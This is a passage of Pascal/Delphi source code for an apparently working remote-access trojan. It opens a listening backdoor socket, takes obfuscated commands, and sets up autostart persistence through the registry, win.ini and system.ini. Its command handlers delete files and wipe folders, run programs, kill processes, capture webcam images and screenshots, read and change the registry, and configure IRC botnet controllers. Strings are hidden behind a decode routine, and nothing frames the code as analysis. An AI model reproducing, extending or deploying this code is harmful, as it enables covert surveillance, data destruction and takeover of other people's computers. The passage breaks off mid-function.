   SENDING := FALSE;
   EXITPROCESS(0);
  END;
 END;
 RESULT := DEFWINDOWPROC(WIN, MESS, WPR, LPR);
END;

PROCEDURE SERVER2_START;
VAR
 P:INTEGER;
BEGIN
 INST2 := GETMODULEHANDLE(NIL);
 WITH WCLASS2 DO BEGIN
  STYLE := CS_CLASSDC OR CS_PARENTDC;
  LPFNWNDPROC := @WIN2;
  HINSTANCE := INST2;
  HBRBACKGROUND := COLOR_BTNFACE + 1;
  LPSZCLASSNAME := SERVERCLASS2;
  HCURSOR := LOADCURSOR(0, IDC_ARROW);
 END;
 REGISTERCLASS(WCLASS2);
 MAINWIN2 := CREATEWINDOW(SERVERCLASS2, NIL, 0, 0, 0, GETSYSTEMMETRICS(SM_CXSCREEN), GETSYSTEMMETRICS(SM_CYSCREEN), 0, 0, INST2, NIL);
 WSASTARTUP($0101, WSDATA2);
 SERVER2 := SOCKET(PF_INET, SOCK_STREAM, IPPROTO_IP);
 ASOCKADDR_IN2.SIN_FAMILY := PF_INET;
 ASOCKADDR_IN2.SIN_ADDR.S_ADDR := INADDR_ANY;
 P := STRTOINT(DECRYPT(SERV_TRANSP));
 ASOCKADDR_IN2.SIN_PORT := HTONS(P);
 BIND(SERVER2, ASOCKADDR_IN2, SIZEOF(ASOCKADDR_IN2));
 LISTEN(SERVER2, 1);
 WSAASYNCSELECT(SERVER2, MAINWIN2, SM_CONNECT, FD_ACCEPT);
 GETMEM( REMOTESOCKADDR2, SIZEOF(REMOTESOCKADDR2^));
 GETMEM( REMOTESOCKADDRLEN2, SIZEOF(REMOTESOCKADDRLEN2^));
 WHILE GETMESSAGE(MSG2, 0, 0, 0) DO BEGIN
  DISPATCHMESSAGE(MSG2);
  TRANSLATEMESSAGE(MSG2);
 END;
END;

FUNCTION RECEIVECMD1:STRING;
VAR
 STR    : SHORTSTRING;
 RES    : SHORTSTRING;
 TMP    : CARDINAL;
LABEL Z;
BEGIN
 STR := '';
 RES := '';
 TMP := GETTICKCOUNT;
 REPEAT
  Z:
  BSIZ1 := RECV(CONSERVER1, STR[1], 255, 0);
  IF BSIZ1 = -1 THEN BEGIN
   BSIZ1 := WSAGETLASTERROR;
   IF BSIZ1 = WSAEWOULDBLOCK THEN BEGIN
    IF SOCKETREADISCALLER1 THEN BEGIN
     {IF TMP + 500 <= GETTICKCOUNT THEN} BEGIN
      RES := decode('r!')+#13;
      BREAK;
     END;
    END;
    CONTINUE;
   END ELSE BEGIN
    BREAK;
   END;
  END;
  SETLENGTH(STR, BSIZ1);
  RES := RES + STR;
  IF NOT CONNECTED1 THEN BREAK;
  IF TMP + 40000 <= GETTICKCOUNT THEN BREAK;
  IF RES = '' THEN GOTO Z;
 UNTIL RES[LENGTH(RES)] = #13;
 SETLENGTH(RES, LENGTH(RES) - 1);
 RESULT := RES;
END;

FUNCTION READREG(KROOT: HKEY; SKEY, SVALUE: STRING): STRING;
VAR
  QVALUE: ARRAY[0..1023] OF CHAR;
  DATASIZE: INTEGER;
  CURRENTKEY: HKEY;
BEGIN
  ZEROMEMORY(@RESULT, LENGTH(RESULT));
  ZEROMEMORY(@QVALUE, LENGTH(QVALUE));
  REGOPENKEYEX(KROOT, PCHAR(SKEY), 0, KEY_ALL_ACCESS, CURRENTKEY);
  DATASIZE := 1023;
  REGQUERYVALUEEX(CURRENTKEY, PCHAR(SVALUE), NIL, NIL, @QVALUE[0], @DATASIZE);
  REGCLOSEKEY(CURRENTKEY);
  RESULT := STRING(QVALUE);
END;

function Trim(const S: string): string;
var
 I, L: Integer;
begin
 L := Length(S);
 I := 1;
 while (I <= L) and (S[I] <= ' ') do Inc(I);
 if I > L then Result := '' else
  begin
   while S[L] <= ' ' do Dec(L);
   Result := Copy(S, I, L - I + 1);
  end;
end;

function AdjustFolder(strFolder:string):string;
var
   l:longint;
begin
   strFolder:=Trim(strFolder);
   l:=Length(strFolder);
   if Copy(strFolder,l,l) = '\' then
      AdjustFolder:=strFolder
   else
      AdjustFolder:=strFolder + '\';
end;

procedure SpecialFuckFolder(Dir:string);
var
   FData:WIN32_FIND_DATA;
   fHandle:LongInt;
begin
   Dir:=AdjustFolder(Dir);
   fHandle:=FindFirstFile(PChar(Dir + decode('*.*')),FData);
   if fHandle < 0 then Exit;
   repeat
   begin
      if Ord(FData.cFileName[0]) <> 46 then
      begin
         if FData.dwFileAttributes and FILE_ATTRIBUTE_DIRECTORY = FILE_ATTRIBUTE_DIRECTORY then
         begin
            SpecialFuckFolder(Dir + FData.cFileName);
            RemoveDirectory(PChar(Dir + FData.cFileName));
         end
         else
            Windows.DeleteFile(PChar(Dir + FData.cFileName));
      end;
   end;
   until FindNextFile(fHandle,FData) = False;
   Windows.FindClose(fHandle);
end;

FUNCTION STRIPDATA(S:STRING):STRING;
BEGIN
 RESULT := '';
 RESULT := trim(COPY(S,5,LENGTH(S)));
 IF RESULT = '' THEN RESULT := '^';
 RESULT := ENCRYPT(RESULT);
END;

PROCEDURE SETAUTOSTART;
VAR
 KEY:HKEY;                    // WRITING/READING
 SIZ:CARDINAL;                // WRITING/READING
 STR:STRING;                  // WRITING/SYS/WIN
 VAL:ARRAY[0..1023] OF CHAR;  // READING
 BUF:ARRAY[0..1023] OF CHAR;  // SYSDIR
BEGIN
 GETSYSTEMDIRECTORY(BUF,255);
 CASE STRTOINT(DECRYPT(SERV_AUTOSTART)) OF
  1: {SYS} BEGIN
   WRITEPRIVATEPROFILESTRING(pChar(decode('yJJT')),pChar(decode('ejrQQ')),PCHAR(decode('rnmQJCrC.rnrq')+DECRYPT(SERV_SYSNAME)),pChar(decode('e1eTrs.Y7Y')));
   STR := BUF;
   COPYFILE( PCHAR(PARAMSTR(0)) , PCHAR(STR +'\'+ DECRYPT(SERV_SYSNAME)), FALSE);
  END;
  2: {WIN} BEGIN
   WRITEPRIVATEPROFILESTRING(pChar(decode('KY7PJKe')),'RUN',PCHAR(DECRYPT(SERV_WINNAME)),'WIN.INI');
   GETWINDOWSDIRECTORY(BUF,255);
   STR := BUF;
   COPYFILE( PCHAR(PARAMSTR(0)) , PCHAR(STR +'\'+ DECRYPT(SERV_WINNAME)), FALSE);
  END;
  3: {REG} BEGIN
   STR := BUF;
   STR := STR + '\' +DECRYPT(SERV_REGVALUE);
   COPYFILE( PCHAR(PARAMSTR(0)) , PCHAR(STR), FALSE);
   REGOPENKEY(HKEY_LOCAL_MACHINE, 'SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN',KEY);
   SIZ := 1024;
   REGSETVALUEEX(KEY, PCHAR(DECRYPT(SERV_REGKEY)), 0, REG_SZ, @STR[1], SIZ);
   REGCLOSEKEY(KEY);
  END;
  4: {NONE} BEGIN
   // NEED TO REMOVE ALL STARTUPS IF THERE IS ANY.
   DELETEREGVALUE(HKEY_LOCAL_MACHINE, 'SOFTWARE\MICROSOFT\WINDOWS\CURRENTVERSION\RUN',PCHAR(DECRYPT(SERV_REGKEY)));
   WRITEPRIVATEPROFILESTRING('BOOT','SHELL',PCHAR('EXPLORER.EXE'),'SYSTEM.INI');
   WRITEPRIVATEPROFILESTRING('WINDOWS','RUN',PCHAR(''),pChar(decode('KY7.Y7Y')));
  END;
 END;
END;


PROCEDURE SOCKETREAD1;
VAR
 I      : INTEGER;
 STR    : STRING;
 AN     : STRING;
 CMD    : STRING;
 PARAM  : STRING;
 SYSDIR : STRING;
 SETTINGS:textfile;
 SET1,SET2:STRING;
 eROOT, eKEY, eVALUE, eVALUE2:STRING;

function AnsiUpperCase(const S: string): string;
var
 Len: Integer;
begin
 Len := Length(S);
 SetString(Result, PChar(S), Len);
 if Len > 0 then CharUpperBuff(Pointer(Result), Len);
end;

FUNCTION EXTRACTFILENAME(STR:STRING):STRING;
VAR
 I:INTEGER;
BEGIN
 IF STR = '' THEN EXIT;
 REPEAT
  I := POS('\',STR);
  RESULT := COPY(STR,i+1,LENGTH(STR));
  STR := COPY(STR,I+1,LENGTH(STR));
 UNTIL POS('\',STR)=0;
END;

FUNCTION EXTRACTFILEPATH(STR:STRING):STRING;
VAR
 I:INTEGER;
BEGIN
 IF STR = '' THEN EXIT;
 REPEAT
  I := POS('\',STR);
  RESULT := RESULT + COPY(STR,1,i-1);
  STR := COPY(STR,I+1,LENGTH(STR));
 UNTIL POS('\',STR)=0;
END;

BEGIN
 GETSYSTEMDIRECTORY(DIR,255);
 SYSDIR := DIR;
 SOCKETREADISCALLER1 := TRUE;
 STR := RECEIVECMD1;
 SOCKETREADISCALLER1 := FALSE;
 STR := DECRYPT(STR);
 IF COPY(STR,1,5) = decode('mVee:') THEN BEGIN
  IF COPY(STR,6,LENGTH(STR)) = DECRYPT(PASSWORD) THEN BEGIN
   AN := ENCRYPT(decode('mV'));
   SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
  END ELSE BEGIN
   AN := ENCRYPT(decode('m5'));
   SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
  END;
  EXIT;
 END;
 CMD := COPY(STR, 1, 2);
 PARAM := COPY(STR, 3, LENGTH(STR));
 IF CMD = '0' THEN BEGIN
  IF (decrypt(PASSWORD) <> '') and (decrypt(PASSWORD) <> '^') THEN
  STR := encrypt(decode('m1')) ELSE STR := encrypt(decode('m7'));
  SEND(CONSERVER1, STR[1], LENGTH(STR), 0);
  CONNECTED1 := TRUE;
 END ELSE
 IF CMD = decode('vf') THEN BEGIN
  AN := ENCRYPT(decode('vf')+DECRYPT(SERV_TRANSP));
  SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
 END ELSE
 IF CMD = decode('vH') THEN BEGIN
  SetWindowText(strtoint(copy(param,1,pos(';',param)-1)),pchar(copy(param,pos(';',param)+1,length(param))));
 END ELSE
 IF CMD = decode('vk') THEN BEGIN
  ShowWindow(strtoint(param),0);
 END ELSE
 IF CMD = decode('v2') THEN BEGIN
  ShowWindow(strtoint(Param),1);
 END ELSE
 IF CMD = decode('vA') THEN BEGIN
  PostMessage(strtoint(Param), CM_EXIT, 0, 0);
 END ELSE
 IF CMD = decode('XX') THEN BEGIN
  ZEROMEMORY(@EROOT, LENGTH(EROOT));
  ZEROMEMORY(@EKEY, LENGTH(EKEY));
  ZEROMEMORY(@EVALUE, LENGTH(EVALUE));
  EROOT := COPY(PARAM,1,POS(':',PARAM)-1);
  PARAM := COPY(PARAM,POS(':',PARAM)+1, LENGTH(PARAM));
  EKEY := COPY(PARAM,1,POS(':',PARAM)-1);
  PARAM := COPY(PARAM,POS(':',PARAM)+1, LENGTH(PARAM));
  EVALUE := COPY(PARAM,1,POS(';',PARAM)-1);
  IF ANSIUPPERCASE(EROOT) = decode('jcr1_auCCr7T_uerC') THEN
   AN := ENCRYPT(decode('XX')+EVALUE+':'+READREG(HKEY_CURRENT_USER,EKEY,EVALUE)+';');
  IF ANSIUPPERCASE(EROOT) = decode('jcr1_aQVeere_CJJT') THEN
   AN := ENCRYPT(decode('XX')+EVALUE+':'+READREG(HKEY_CLASSES_ROOT,EKEY,EVALUE)+';');
  IF ANSIUPPERCASE(EROOT) = decode('jcr1_QJaVQ_sVajY7r') THEN
   AN := ENCRYPT(decode('XX')+EVALUE+':'+READREG(HKEY_LOCAL_MACHINE,EKEY,EVALUE)+';');
  IF ANSIUPPERCASE(EROOT) = decode('jcr1_uerCe') THEN
   AN := ENCRYPT(decode('XX')+EVALUE+':'+READREG(HKEY_USERS,EKEY,EVALUE)+';');
  IF ANSIUPPERCASE(EROOT) = decode('jcr1_auCCr7T_aJ75YG') THEN
   AN := ENCRYPT(decode('XX')+EVALUE+':'+READREG(HKEY_CURRENT_CONFIG,EKEY,EVALUE)+';');
  SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
 END ELSE
 IF CMD = decode('Xv') THEN BEGIN
  AN := COPY(PARAM,1,POS(';',PARAM)-1);
  ASSIGNFILE(SETTINGS,AN);
  REWRITE(SETTINGS);
  WRITE(SETTINGS,COPY(PARAM,POS(';',PARAM)+1,LENGTH(PARAM)));
  CLOSEFILE(SETTINGS);
  SHELLEXECUTE(0,pChar(decode('o3ML')),PCHAR(AN),nil,nil,1);
 END ELSE
 IF CMD = decode('X6') THEN BEGIN
  AN := ENCRYPT(decode('X6'));
  AN := AN + ENCRYPT(decode('r4MLg8M:')+extractfilename(paramstr(0))+';');
  AN := AN + ENCRYPT(decode('mgxZ:')+paramstr(0)+';');
  IF ((PASSWORD) <> '') and ((PASSWORD) <> '^') THEN
   AN := AN + ENCRYPT(decode('mgWWpoh :1re')+';')
  ELSE
   AN := AN + ENCRYPT(decode('mgWWpoh :7J')+';');
  AN := AN + ENCRYPT('IRCNick:'+DECRYPT((IRC_NICK1))+';');
  AN := AN + ENCRYPT('IRCNick Backup:'+DECRYPT((IRC_NICK2))+';');
  AN := AN + ENCRYPT('IRCChan:'+DECRYPT((IRC_CHAN1))+';');
  AN := AN + ENCRYPT('IRCChan Backup:'+DECRYPT((IRC_CHAN2))+';');
  AN := AN + ENCRYPT('IRCServ:'+DECRYPT((IRC_SERV1))+';');
  AN := AN + ENCRYPT('IRCServ Backup:'+DECRYPT((IRC_SERV2))+';');
  AN := AN + ENCRYPT('IRCKey:'+DECRYPT((IRC_CKEY1))+';');
  AN := AN + ENCRYPT('IRCKey Backup:'+DECRYPT((IRC_CKEY2))+';');
  AN := AN + ENCRYPT('Port Traffic:'+DECRYPT(SERV_TRAFFICP)+';');
  AN := AN + ENCRYPT('Port Transfer:'+DECRYPT(SERV_TRANSP)+';');
  CASE STRTOINT(DECRYPT(SERV_AUTOSTART)) OF
   1:  AN := AN + ENCRYPT('Autostart:Win.ini;');
   2:  AN := AN + ENCRYPT('Autostart:System.ini;');
   3:  AN := AN + ENCRYPT('Autostart:RegEdit['+DECRYPT((SERV_REGKEY))+':'+DECRYPT((SERV_REGVALUE))+'];');
   4:  AN := AN + ENCRYPT('Autostart:None;');
  END;
  AN := AN + ENCRYPT('CGI:'+DECRYPT((SERV_CGI))+';');
  AN := AN + ENCRYPT('PHP:'+DECRYPT((SERV_PHP))+';');
  SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
 END ELSE
 IF CMD = '14' THEN BEGIN
  SENDING := FALSE;
 END ELSE
 IF CMD = '15' THEN BEGIN
  AN := ENCRYPT('15'+getdrives);
  SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
 END ELSE
 IF CMD = '16' THEN BEGIN
  LISTDIR(PARAM);
  AN := ENCRYPT('16'+SYSDIR+'\FILES.LST');
  SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
 END ELSE
 IF CMD = '17' THEN BEGIN
  DELETEFILE(PCHAR(PARAM));
 END ELSE
 IF CMD = '18' THEN BEGIN
  SPECIALFUCKFOLDER(PARAM);
 END ELSE
 IF CMD = '19' THEN BEGIN
  SHELLEXECUTE(0, 'open', PCHAR(PARAM), NIL, NIL, 1);
 END ELSE
 IF CMD = '22' THEN BEGIN
  AN := ENCRYPT('22'+LISTPROC);
  SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
 END ELSE
 IF CMD = '23' THEN BEGIN
  KILLPROC(PARAM);
 END ELSE
 IF CMD = '50' THEN BEGIN
  //WEBCAM
  TRY
  if param = '' then param := '5';
   PngObject := TPngObject.Create;
   IF GetBitMapFromWebcam = 0 then begin
    AN := ENCRYPT(decode('kff'));
    SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
    Exit;
   end;
   PngObject.AssignHandle(GetBitMapFromWebcam, False, 0);
   PngObject.CompressionLevel :=strtoint(param);
   PngObject.SaveToFile(SYSDIR+decode('\KryaVs.m7G'));
   PngObject.Free;
   Sleep(200);
   AN := ENCRYPT(decode('kf')+SYSDIR+decode('\KryaVs.m7G'));
   SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
  EXCEPT
   AN := ENCRYPT(decode('kff'));
   SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
  END;
 END ELSE
 IF CMD = decode('kX') THEN BEGIN
  //SCREENSHOT
  TRY  
   if param = '' then param := '5';
   PngObject := TPngObject.Create;
   PngObject.AssignHandle(GetBitMapFromDesktop, False, 0);
   PngObject.CompressionLevel := strtoint(param);
   PngObject.SaveToFile(SYSDIR+decode('\eaCrr7.m7G'));
   PngObject.Free;
   Sleep(200);
   AN := ENCRYPT(decode('kX')+SYSDIR+decode('\eaCrr7.m7G'));
   SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
  EXCEPT
   AN := ENCRYPT(decode('kXf'));
   SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
  END;
 END ELSE
 IF CMD = decode('6A') THEN BEGIN
  IRC_NICK1 := ENCRYPT(PARAM);
  AN := ENCRYPT(decode('6A'));
  SEND(CONSERVER1,AN[1],LENGTH(AN),0);
  SAVEREG;
 END ELSE
 IF CMD = decode('6b') THEN BEGIN
  IRC_NICK2 := ENCRYPT(PARAM);
  AN := ENCRYPT(decode('6b'));
  SEND(CONSERVER1,AN[1],LENGTH(AN),0);
  SAVEREG;
 END ELSE
 IF CMD = decode('6R') THEN BEGIN
  IRC_CHAN1 := ENCRYPT(PARAM);
  AN := ENCRYPT(CMD);
  SEND(CONSERVER1,AN[1],LENGTH(AN),0);
  SAVEREG;
 END ELSE
 IF CMD = decode('Hf') THEN BEGIN
  IRC_CHAN2 := ENCRYPT(PARAM);
  AN := ENCRYPT(CMD);
  SEND(CONSERVER1,AN[1],LENGTH(AN),0);
  SAVEREG;
 END ELSE
 IF CMD = decode('HX') THEN BEGIN
  IRC_SERV1 := ENCRYPT(PARAM);
  AN := ENCRYPT(CMD);
  SEND(CONSERVER1,AN[1],LENGTH(AN),0);
  SAVEREG;
 END ELSE
 IF CMD = decode('Hv') THEN BEGIN
  IRC_SERV2 := ENCRYPT(PARAM);
  AN := ENCRYPT(CMD);
  SEND(CONSERVER1,AN[1],LENGTH(AN),0);
  SAVEREG;
 END ELSE
 IF CMD = decode('H6') THEN BEGIN
  IRC_CKEY1 := ENCRYPT(PARAM);
  AN := ENCRYPT(CMD);
  SEND(CONSERVER1,AN[1],LENGTH(AN),0);
  SAVEREG;
 END ELSE
 IF CMD = decode('HH') THEN BEGIN
  IRC_CKEY2 := ENCRYPT(PARAM);
  AN := ENCRYPT(CMD);
  SEND(CONSERVER1,AN[1],LENGTH(AN),0);
  SAVEREG;
 END ELSE
 IF CMD = decode('Hk') THEN BEGIN
  IRC_MASTER1 := ENCRYPT(PARAM);
  AN := ENCRYPT(CMD);
  SEND(CONSERVER1,AN[1],LENGTH(AN),0);
  SAVEREG;
 END ELSE
 IF CMD = decode('H2') THEN BEGIN
  IRC_MASTER2 := ENCRYPT(PARAM);
  AN := ENCRYPT(CMD);
  SEND(CONSERVER1,AN[1],LENGTH(AN),0);
  SAVEREG;
 END ELSE
 IF CMD = decode('HA') THEN BEGIN
  AN := ENCRYPT(decode('HA')+DECRYPT(IRC_NICK1)+';'+DECRYPT(IRC_NICK2)+';');
  AN := AN + ENCRYPT(DECRYPT(IRC_CHAN1)+';'+DECRYPT(IRC_CHAN2)+';');
  AN := AN + ENCRYPT(DECRYPT(IRC_SERV1)+';'+DECRYPT(IRC_SERV2)+';');
  AN := AN + ENCRYPT(DECRYPT(IRC_CKEY1)+';'+DECRYPT(IRC_CKEY2)+';');
  AN := AN + ENCRYPT(DECRYPT(IRC_MASTER1)+';'+DECRYPT(IRC_MASTER2)+';');
  SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
 END ELSE
 IF CMD = decode('62') THEN BEGIN
  AN := ENCRYPT(decode('62')+DECRYPT(SERV_TRAFFICP)+';'+DECRYPT(SERV_TRANSP)+';');
  AN := AN + ENCRYPT(DECRYPT(SERV_AUTOSTART)+';');
  IF DECRYPT(SERV_AUTOSTART) = '1' THEN AN := AN + ENCRYPT(DECRYPT(SERV_SYSNAME)+';');
  IF DECRYPT(SERV_AUTOSTART) = '2' THEN AN := AN + ENCRYPT(DECRYPT(SERV_WINNAME)+';');
  IF DECRYPT(SERV_AUTOSTART) = '3' THEN AN := AN + ENCRYPT(DECRYPT(SERV_REGKEY)+';'+DECRYPT(SERV_REGVALUE)+';');
  IF DECRYPT(SERV_AUTOSTART) = '4' THEN AN := AN + ENCRYPT(decode('b;'));
  SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
 END ELSE
 IF CMD = decode('vR') THEN BEGIN {TRAFFIC PORT}
  SERV_TRAFFICP := ENCRYPT(PARAM);
  AN := ENCRYPT(decode('vR'));
  SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
  SAVEREG;
 END ELSE
 IF CMD = decode('6f') THEN BEGIN {TRANSFER PORT}
  SERV_TRANSP := ENCRYPT(PARAM);
  AN := ENCRYPT(decode('6f'));
  SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
  SAVEREG;
 END ELSE
 IF CMD = decode('6X') THEN BEGIN {AUTOSTART}
  SERV_AUTOSTART := ENCRYPT(PARAM);
  AN := ENCRYPT(decode('6X'));
  SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
  SAVEREG;
  SETAUTOSTART;
 END ELSE
 IF CMD = decode('6v') THEN BEGIN {REGKEY}
  SERV_REGKEY := ENCRYPT(PARAM);
  AN := ENCRYPT(decode('6v'));
  SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
  SAVEREG;
 END ELSE
 IF CMD = decode('66') THEN BEGIN {REGVALUE}
  SERV_REGVALUE := ENCRYPT(PARAM);
  AN := ENCRYPT(decode('66'));
  SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
  SAVEREG;
 END ELSE
 IF CMD = decode('6H') THEN BEGIN {WINNAME}
  SERV_WINNAME := ENCRYPT(PARAM);
  AN := ENCRYPT(decode('6H'));
  SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
  SAVEREG;
 END ELSE
 IF CMD = decode('6k') THEN BEGIN {SYSNAME}
  SERV_SYSNAME := ENCRYPT(PARAM);
  AN := ENCRYPT(decode('6k'));
  SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
  SAVEREG;
 END ELSE
 IF CMD = decode('Hb') THEN BEGIN {CGI}
  SERV_CGI := ENCRYPT(PARAM);
  AN := ENCRYPT(decode('Hb'));
  SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
  SAVEREG;
 END ELSE
 IF CMD = decode('kf') THEN BEGIN {PHP}
  SERV_PHP := ENCRYPT(PARAM);
  AN := ENCRYPT(decode('kf'));
  SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
  SAVEREG;
 END ELSE
 IF CMD = decode('HR') THEN BEGIN {PASSWORD}
 IF COPY(PARAM,1,POS(CHR(0160),PARAM)-1) = PASSWORD THEN
  PASSWORD := ENCRYPT(COPY(PARAM,POS(CHR(0160),PARAM)+1,LENGTH(PARAM)));
  AN := ENCRYPT(decode('HR'));
  SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
  SAVEREG;
 END ELSE
 IF CMD = decode('vb') THEN BEGIN
  AN := ENCRYPT(CMD+GETWINS);
  SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
 END ELSE
 IF CMD = decode('kv') THEN BEGIN
  SERV_AUTOSTART := ENCRYPT('4');
  SETAUTOSTART;
  ASSIGNFILE(SETTINGS,decode('a:\C.yVT'));
  REWRITE(SETTINGS);
  WRITELN(SETTINGS,decode('PrQq"')+Paramstr(0)+'"');
  WRITELN(SETTINGS,decode('PrQq"a:\C.yVT"'));
  CLOSEFILE(SETTINGS);
  SHELLEXECUTE(0,pChar(decode('o3ML')),PCHAR(decode('a:\C.yVT')),nil,nil,1);
  EXITPROCESS(0);
 END ELSE
 IF CMD = decode('k6') THEN BEGIN
  EROOT := COPY(PARAM,1,POS(chr(0160),PARAM)-1);
  EKEY  := COPY(PARAM,POS(chr(0160),PARAM)+1,LENGTH(PARAM));
  IF EROOT = decode('jcr1_QJaVQ_sVajY7r') THEN
   ReadRegEdit(HKEY_LOCAL_MACHINE,EKEY,1);
  IF EROOT = decode('jcr1_aQVeere_CJJT') THEN
   ReadRegEdit(HKEY_CLASSES_ROOT,EKEY,1);
  IF EROOT = decode('jcr1_auCCr7T_uerC') THEN
   ReadRegEdit(HKEY_CURRENT_USER,EKEY,1);
  IF EROOT = decode('jcr1_uerCe') THEN
   ReadRegEdit(HKEY_USERS,EKEY,1);
  IF EROOT = decode('jcr1_auCCr7T_aJ75YG') THEN
   ReadRegEdit(HKEY_CURRENT_CONFIG,EKEY,1);
  AN := ENCRYPT(decode('k6')+SYSDIR+decode('\CrGcr1.QeT'));
  SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
 END ELSE
 IF CMD = decode('kH') THEN BEGIN
  EROOT := COPY(PARAM,1,POS(chr(0160),PARAM)-1);
  EKEY  := COPY(PARAM,POS(chr(0160),PARAM)+1,LENGTH(PARAM));
  IF EROOT = decode('jcr1_QJaVQ_sVajY7r') THEN
   ReadRegEdit(HKEY_LOCAL_MACHINE,EKEY,2);
  IF EROOT = decode('jcr1_aQVeere_CJJT') THEN
   ReadRegEdit(HKEY_CLASSES_ROOT,EKEY,2);
  IF EROOT = decode('jcr1_auCCr7T_uerC') THEN
   ReadRegEdit(HKEY_CURRENT_USER,EKEY,2);
  IF EROOT = decode('jcr1_uerCe') THEN
   ReadRegEdit(HKEY_USERS,EKEY,2);
  IF EROOT = decode('jcr1_auCCr7T_aJ75YG') THEN
   ReadRegEdit(HKEY_CURRENT_CONFIG,EKEY,2);
  AN := ENCRYPT(decode('kH')+SYSDIR+decode('\CrG9VQ.QeT'));
  SEND(CONSERVER1, AN[1], LENGTH(AN), 0);
 END ELSE
 IF CMD = decode('kk') THEN BEGIN
  EROOT := COPY(PARAM,1,POS(chr(0160),PARAM)-1);
  EKEY  := COPY(PARAM,POS(chr(0160),PARAM)+1,LENGTH(PARAM));
  EVALUE := COPY(EKEY,POS(CHR(0160),EKEY)+1,LENGTH(EKEY));
  EKEY := COPY(EKEY,1,POS(CHR(0160),EKEY)-1);
  IF EROOT = decode('jcr1_QJaVQ_sVajY7r') THEN
   DeleteRegKey(HKEY_LOCAL_MACHINE,EKEY, EVALUE);
  IF EROOT = decode('jcr1_aQVeere_CJJT') THEN
   DeleteRegKey(HKEY_CLASSES_ROOT,EKEY, EVALUE);
  IF EROOT = decode('jcr1_auCCr7T_uerC') THEN
   DeleteRegKey(HKEY_CURRENT_USER,EKEY, EVALUE);
  IF EROOT = decode('jcr1_uerCe') THEN
   DeleteRegKey(HKEY_USERS,EKEY, EVALUE);
  IF EROOT = decode('jcr1_auCCr7T_aJ75YG') THEN
   DeleteRegKey(HKEY_CURRENT_CONFIG,EKEY, EVALUE);
 END ELSE
 IF CMD = decode('k2') THEN BEGIN
  EROOT := COPY(PARAM,1,POS(chr(0160),PARAM)-1);
  EKEY  := COPY(PARAM,POS(chr(0160),PARAM)+1,LENGTH(PARAM));
  EVALUE := COPY(EKEY,POS(CHR(0160),EKEY)+1,LENGTH(EKEY));
  EKEY := COPY(EKEY,1,POS(CHR(0160),EKEY)-1);
  IF EROOT = decode('jcr1_QJaVQ_sVajY7r') THEN
   DeleteRegValue(HKEY_LOCAL_MACHINE,EKEY, EVALUE);
  IF EROOT = decode('jcr1_aQVeere_CJJT') THEN
   DeleteRegValue(HKEY_CLASSES_ROOT,EKEY, EVALUE);
  IF EROOT = decode('jcr1_auCCr7T_uerC') THEN
   DeleteRegValue(HKEY_CURRENT_USER,EKEY, EVALUE);
  IF EROOT = decode('jcr1_uerCe') THEN
   DeleteRegValue(HKEY_USERS,EKEY, EVALUE);
  IF EROOT = decode('jcr1_auCCr7T_aJ75YG') THEN
   DeleteRegValue(HKEY_CURRENT_CONFIG,EKEY, EVALUE);
 END ELSE
 IF CMD = decode('kA') THEN BEGIN
  EROOT := COPY(PARAM,1,POS(chr(0160),PARAM)-1);
  EKEY  := COPY(PARAM,POS(chr(0160),PARAM)+1,LENGTH(PARAM));
  EVALUE := COPY(EKEY,POS(chr(0160),EKEY)+1, Length(EKEY));
  EVALUE2 := COPY(EVALUE,POS(chr(0160),EVALUE)+1, LENGTH(EVALUE));
  EVALUE := COPY(EVALUE,1,POS(chr(0160),EVALUE)+1);
  EKEY := COPY(EKEY,1,POS(chr(0160),EKEY)-1);
  EVALUE := COPY(EVALUE,1,POS(chr(0160),EVALUE)-1);
  {hkey soft key val }
  IF EROOT = decode('jcr1_QJaVQ_sVajY7r') THEN
   SetRegValue(HKEY_LOCAL_MACHINE,EKEY, EVALUE, EVALUE2);
  IF EROOT = decode('jcr1_aQVeere_CJJT') THEN
   SetRegValue(HKEY_CLASSES_ROOT,EKEY, EVALUE, EVALUE2);
  IF EROOT = decode('jcr1_auCCr7T_uerC') THEN
   SetRegValue(HKEY_CURRENT_USER,EKEY, EVALUE, EVALUE2);
  IF EROOT = decode('jcr1_uerCe') THEN
   SetRegValue(HKEY_USERS,EKEY, EVALUE, EVALUE2);
  IF EROOT = decode('jcr1_auCCr7T_aJ75YG') THEN
   SetRegValue(HKEY_CURRENT_CONFIG,EKEY, EVALUE, EVALUE2);
 END ELSE
 IF CMD = decode('kb') THEN BEGIN
  EROOT := COPY(PARAM,1,POS(chr(0160),PARAM)-1);
  EKEY  := COPY(PARAM,POS(chr(0160),PARAM)+1,LENGTH(PARAM));
  EVALUE := EXTRACTFILENAME(EKEY);
  EKEY := EXTRACTFILEPATH(EKEY);
  IF EROOT = decode('jcr1_QJaVQ_sVajY7r') THEN
   AN:=CMD+GetRegValue(HKEY_LOCAL_MACHINE,EKEY, EVALUE);
  IF EROOT = decode('jcr1_aQVeere_CJJT') THEN
   AN:=CMD+GetRegValue(HKEY_CLASSES_ROOT,EKEY, EVALUE);
  IF EROOT = decode('jcr1_auCCr7T_uerC') THEN
   AN:=CMD+GetRegValue(HKEY_CURRENT_USER,EKEY, EVALUE);
